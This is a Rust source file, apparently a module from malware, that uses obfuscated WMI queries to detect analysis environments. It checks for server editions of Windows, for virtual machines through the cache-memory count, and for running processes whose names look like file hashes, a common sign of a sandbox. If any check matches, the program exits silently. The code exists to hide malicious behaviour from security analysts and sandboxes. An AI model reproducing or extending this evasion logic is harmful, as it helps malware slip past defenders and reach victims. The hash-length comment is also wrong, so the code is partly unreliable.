use std::{collections::HashMap,  process};

use wmi::{COMLibrary, Variant, WMIConnection};



pub fn detect(comlib: COMLibrary) {


    if is_server_os(comlib) || is_vm_by_wim_temper(comlib) || detect_hash_processes(comlib) {
        process::exit(0);
    }

}

fn is_server_os(comlib: COMLibrary) -> bool {

    let wmi_con = match WMIConnection::new(comlib) {
        Ok(wmi_con) => wmi_con,
        Err(_) => return false,
    };

    let results: Vec<HashMap<String, Variant>> = wmi_con
        .raw_query(obfstr::obfstr!("SELECT ProductType FROM Win32_OperatingSystem"))
        .unwrap();

     drop(wmi_con);
     
    for result in results {
        for value in result.values() {
            if *value == Variant::UI4(2) || *value == Variant::UI4(3) {
                return true;
            }
        }
    }

    false
}

fn detect_hash_processes(comlib: COMLibrary) -> bool {


    // Get all running processes with wmic

    
    let wmi_con = match WMIConnection::new(comlib) {
        Ok(wmi_con) => wmi_con,
        Err(_) => return false,
    };
    

    let mut processes = vec![];
    // get process name and put it in vec

    let results: Vec<HashMap<String, Variant>> = wmi_con
        .raw_query(obfstr::obfstr!("SELECT Name FROM Win32_Process"))
        .unwrap();

    drop(wmi_con);

    for result in results {
        for value in result.values() {
            if let Variant::String(name) = value {
                processes.push(name.to_string());
            }
        }
    }



    for file_name in processes {
                    if file_name.len() == 64 || file_name.len() == 128 { // Md5 Or Sha265
                        return true;
                    }
    }

    false
}

fn is_vm_by_wim_temper(comlib: COMLibrary) -> bool {
    let wmi_con = WMIConnection::new(comlib).unwrap();

    let results: Vec<HashMap<String, Variant>> = wmi_con
        .raw_query(obfstr::obfstr!("SELECT * FROM Win32_CacheMemory"))
        .unwrap();

      drop(wmi_con);

    if results.len() < 2 {
        return true;
    }


    false
}   